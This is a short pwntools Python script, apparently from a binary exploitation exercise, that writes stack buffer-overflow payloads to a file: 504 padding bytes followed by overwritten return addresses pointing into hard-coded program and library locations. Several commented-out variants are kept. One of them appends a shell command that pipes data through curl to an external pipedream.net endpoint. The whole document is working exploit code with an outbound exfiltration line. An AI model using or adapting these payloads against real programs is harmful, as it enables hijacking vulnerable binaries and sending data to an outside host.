from pwn import *

# a = b"a"*504 + p32(0xf7fe22f0) + b'bbbb' + p32(0xffffd118) + p32(0x0804847d) + p32(0xf7faf000) + p32(0xf7faf000)
# with open('c5.txt', 'wb') as fh:
#     fh.write(a)
# a = b"a"*504 + b'cccc' + b'bbbb' + b'cccc' + p32(0x08048350) + b'dddd' + p32(0x08048590)
# a = b"a"*504 + b'cccc' + b'bbbb' + b'cccc' + p32(0x08048350) + b'dddd' + p32(0xffffd118) + b'echo yeet | curl -d @- https://en02warpzll5mr.x.pipedream.net' + b'\x00'
# a = b"a"*504 + b'cccc' + b'bbbb' + b'cccc' + p32(0x0804847d)
a = b"a"*504 + b'cccc' + b'bbbb' + b'cccc' + p32(0x0804847d) + p32(0x0804847d) + p32(0x0804847d) + p32(0x0804847d)
with open('c5.txt', 'wb') as fh:
    fh.write(a)